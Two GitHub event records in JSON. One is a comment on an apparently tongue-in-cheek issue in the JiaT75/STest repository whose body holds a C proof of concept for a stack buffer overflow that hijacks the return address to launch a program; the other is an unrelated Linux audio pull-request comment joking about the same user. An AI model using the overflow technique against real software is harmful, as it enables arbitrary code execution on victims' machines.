{"id":"37064021046","type":"IssueCommentEvent","actor":{"id":90941580,"login":"64ArthurAraujo","display_login":"64ArthurAraujo","gravatar_id":"","url":"https://api.github.com/users/64ArthurAraujo","avatar_url":"https://avatars.githubusercontent.com/u/90941580?"},"repo":{"id":437877817,"name":"JiaT75/STest","url":"https://api.github.com/repos/JiaT75/STest"},"payload":{"action":"created","issue":{"url":"https://api.github.com/repos/JiaT75/STest/issues/11","repository_url":"https://api.github.com/repos/JiaT75/STest","labels_url":"https://api.github.com/repos/JiaT75/STest/issues/11/labels{/name}","comments_url":"https://api.github.com/repos/JiaT75/STest/issues/11/comments","events_url":"https://api.github.com/repos/JiaT75/STest/issues/11/events","html_url":"https://github.com/JiaT75/STest/issues/11","id":2216691001,"node_id":"I_kwDOGhl8Oc6EIAU5","number":11,"title":"Exploitable stack buffer overflow","user":{"login":"castyte","id":165521809,"node_id":"U_kgDOCd2pkQ","avatar_url":"https://avatars.githubusercontent.com/u/165521809?v=4","gravatar_id":"","url":"https://api.github.com/users/castyte","html_url":"https://github.com/castyte","followers_url":"https://api.github.com/users/castyte/followers","following_url":"https://api.github.com/users/castyte/following{/other_user}","gists_url":"https://api.github.com/users/castyte/gists{/gist_id}","starred_url":"https://api.github.com/users/castyte/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/castyte/subscriptions","organizations_url":"https://api.github.com/users/castyte/orgs","repos_url":"https://api.github.com/users/castyte/repos","events_url":"https://api.github.com/users/castyte/events{/privacy}","received_events_url":"https://api.github.com/users/castyte/received_events","type":"User","site_admin":false},"labels":[],"state":"open","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":5,"created_at":"2024-03-30T22:49:41Z","updated_at":"2024-04-01T21:07:41Z","closed_at":null,"author_association":"NONE","active_lock_reason":null,"body":"Good afternoon,\r\n\r\nThere is a stack-based buffer overflow vulnerability in various functions of this library, including `stest_assert_string_equal` and `assert_n_array_equal`. If the library is used to test untrusted input (for example, a file you found in [tukaani-project/xz](https://github.com/tukaani-project/xz)) a devious individual would be able to construct a malicious file to achieve arbitrary code execution on anyone running the tests.\r\n\r\nI have included an example of how it might look on x86_64 Linux. Here as an example I hijack the return to go to a predefined function, but of course you could ROP instead.\r\n\r\n```c\r\n#include \"../src/stest.h\"\r\n#include <stdint.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include \"stddef.h\"\r\n#include <memory.h>\r\n\r\n#define without_logging(X) stest_disable_logging(); X; stest_enable_logging();\r\n#define assert_test_passes(X) without_logging(X); stest_assert_last_passed(__FUNCTION__, __LINE__);\r\n#define assert_test_fails(X) without_logging(X); stest_assert_last_failed(__FUNCTION__, __LINE__);\r\n\r\nstatic void example() {\r\n  execl(\"/usr/bin/gnome-calculator\", \"gnome-calculator\", NULL);\r\n}\r\n\r\nstatic void test_stack_nuke() {\r\n  // E.g. read a wholesome file provided kindly by the XZ maintainer\r\n  static char untrusted_input[10100] = {0};\r\n  memset(untrusted_input, 'A', 10000);\r\n  *(uint64_t*)&untrusted_input[10000] = example;\r\n\r\n  // What could go wrong\r\n  assert_test_fails(assert_string_equal(NULL, untrusted_input));\r\n}\r\n\r\nvoid test_fixture_stest() {\r\n  test_fixture_start();\r\n  run_test(test_stack_nuke);\r\n  test_fixture_end();\r\n}\r\n\r\nint main(int argc, char **argv) {\r\n  return stest_testrunner(argc, argv, test_fixture_stest, NULL, NULL);\r\n}\r\n```\r\n\r\nI trust you will fix this issue promptly, I am sure security is a high priority.\r\n\r\nYours truly,\r\nMr. Darnell Castyte","reactions":{"url":"https://api.github.com/repos/JiaT75/STest/issues/11/reactions","total_count":50,"+1":0,"-1":0,"laugh":36,"hooray":5,"confused":0,"heart":0,"rocket":6,"eyes":3},"timeline_url":"https://api.github.com/repos/JiaT75/STest/issues/11/timeline","performed_via_github_app":null,"state_reason":null},"comment":{"url":"https://api.github.com/repos/JiaT75/STest/issues/comments/2030558132","html_url":"https://github.com/JiaT75/STest/issues/11#issuecomment-2030558132","issue_url":"https://api.github.com/repos/JiaT75/STest/issues/11","id":2030558132,"node_id":"IC_kwDOGhl8Oc55B9u0","user":{"login":"64ArthurAraujo","id":90941580,"node_id":"MDQ6VXNlcjkwOTQxNTgw","avatar_url":"https://avatars.githubusercontent.com/u/90941580?v=4","gravatar_id":"","url":"https://api.github.com/users/64ArthurAraujo","html_url":"https://github.com/64ArthurAraujo","followers_url":"https://api.github.com/users/64ArthurAraujo/followers","following_url":"https://api.github.com/users/64ArthurAraujo/following{/other_user}","gists_url":"https://api.github.com/users/64ArthurAraujo/gists{/gist_id}","starred_url":"https://api.github.com/users/64ArthurAraujo/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/64ArthurAraujo/subscriptions","organizations_url":"https://api.github.com/users/64ArthurAraujo/orgs","repos_url":"https://api.github.com/users/64ArthurAraujo/repos","events_url":"https://api.github.com/users/64ArthurAraujo/events{/privacy}","received_events_url":"https://api.github.com/users/64ArthurAraujo/received_events","type":"User","site_admin":false},"created_at":"2024-04-01T21:07:41Z","updated_at":"2024-04-01T21:07:41Z","author_association":"NONE","body":"> @64ArthurAraujo \n> It was just a joke about this issue because the entire issue is itself a joke.\n> \n> \n\ni tought you were asking about the xz vulnerability lol ","reactions":{"url":"https://api.github.com/repos/JiaT75/STest/issues/comments/2030558132/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"performed_via_github_app":null}},"public":true,"created_at":"2024-04-01T21:07:42Z"}
{"id":"37064704062","type":"IssueCommentEvent","actor":{"id":46978960,"login":"marc-hb","display_login":"marc-hb","gravatar_id":"","url":"https://api.github.com/users/marc-hb","avatar_url":"https://avatars.githubusercontent.com/u/46978960?"},"repo":{"id":135611127,"name":"thesofproject/linux","url":"https://api.github.com/repos/thesofproject/linux"},"payload":{"action":"created","issue":{"url":"https://api.github.com/repos/thesofproject/linux/issues/4894","repository_url":"https://api.github.com/repos/thesofproject/linux","labels_url":"https://api.github.com/repos/thesofproject/linux/issues/4894/labels{/name}","comments_url":"https://api.github.com/repos/thesofproject/linux/issues/4894/comments","events_url":"https://api.github.com/repos/thesofproject/linux/issues/4894/events","html_url":"https://github.com/thesofproject/linux/pull/4894","id":2218711509,"node_id":"PR_kwDOCBVC985rV1Sf","number":4894,"title":"[DNM] Random attempts to fix controller reset issue","user":{"login":"plbossart","id":1149035,"node_id":"MDQ6VXNlcjExNDkwMzU=","avatar_url":"https://avatars.githubusercontent.com/u/1149035?v=4","gravatar_id":"","url":"https://api.github.com/users/plbossart","html_url":"https://github.com/plbossart","followers_url":"https://api.github.com/users/plbossart/followers","following_url":"https://api.github.com/users/plbossart/following{/other_user}","gists_url":"https://api.github.com/users/plbossart/gists{/gist_id}","starred_url":"https://api.github.com/users/plbossart/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/plbossart/subscriptions","organizations_url":"https://api.github.com/users/plbossart/orgs","repos_url":"https://api.github.com/users/plbossart/repos","events_url":"https://api.github.com/users/plbossart/events{/privacy}","received_events_url":"https://api.github.com/users/plbossart/received_events","type":"User","site_admin":false},"labels":[],"state":"open","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":5,"created_at":"2024-04-01T17:26:38Z","updated_at":"2024-04-01T21:37:11Z","closed_at":null,"author_association":"MEMBER","active_lock_reason":null,"draft":true,"pull_request":{"url":"https://api.github.com/repos/thesofproject/linux/pulls/4894","html_url":"https://github.com/thesofproject/linux/pull/4894","diff_url":"https://github.com/thesofproject/linux/pull/4894.diff","patch_url":"https://github.com/thesofproject/linux/pull/4894.patch","merged_at":null},"body":"suggested hacks based on code review only \r\n\r\n~~I don't see any improvement on the hardware but the code does look suspicious.~~\r\n\r\nwith the 3rd commit I can't reproduce the errors reported in issue #4889 root-caused to the use of PIO commands (see PR #4892)","reactions":{"url":"https://api.github.com/repos/thesofproject/linux/issues/4894/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/thesofproject/linux/issues/4894/timeline","performed_via_github_app":null,"state_reason":null},"comment":{"url":"https://api.github.com/repos/thesofproject/linux/issues/comments/2030602878","html_url":"https://github.com/thesofproject/linux/pull/4894#issuecomment-2030602878","issue_url":"https://api.github.com/repos/thesofproject/linux/issues/4894","id":2030602878,"node_id":"IC_kwDOCBVC9855CIp-","user":{"login":"marc-hb","id":46978960,"node_id":"MDQ6VXNlcjQ2OTc4OTYw","avatar_url":"https://avatars.githubusercontent.com/u/46978960?v=4","gravatar_id":"","url":"https://api.github.com/users/marc-hb","html_url":"https://github.com/marc-hb","followers_url":"https://api.github.com/users/marc-hb/followers","following_url":"https://api.github.com/users/marc-hb/following{/other_user}","gists_url":"https://api.github.com/users/marc-hb/gists{/gist_id}","starred_url":"https://api.github.com/users/marc-hb/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/marc-hb/subscriptions","organizations_url":"https://api.github.com/users/marc-hb/orgs","repos_url":"https://api.github.com/users/marc-hb/repos","events_url":"https://api.github.com/users/marc-hb/events{/privacy}","received_events_url":"https://api.github.com/users/marc-hb/received_events","type":"User","site_admin":false},"created_at":"2024-04-01T21:37:10Z","updated_at":"2024-04-01T21:37:10Z","author_association":"COLLABORATOR","body":"> And for reference, the original clear was added in 2007 by someone using an \"obiwan\" email. Who said we can't have fun at work, eh?\r\n\r\nThis could have been worse, it could have been \"JiaT75\"","reactions":{"url":"https://api.github.com/repos/thesofproject/linux/issues/comments/2030602878/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"performed_via_github_app":null}},"public":true,"created_at":"2024-04-01T21:37:12Z","org":{"id":39773507,"login":"thesofproject","gravatar_id":"","url":"https://api.github.com/orgs/thesofproject","avatar_url":"https://avatars.githubusercontent.com/u/39773507?"}}
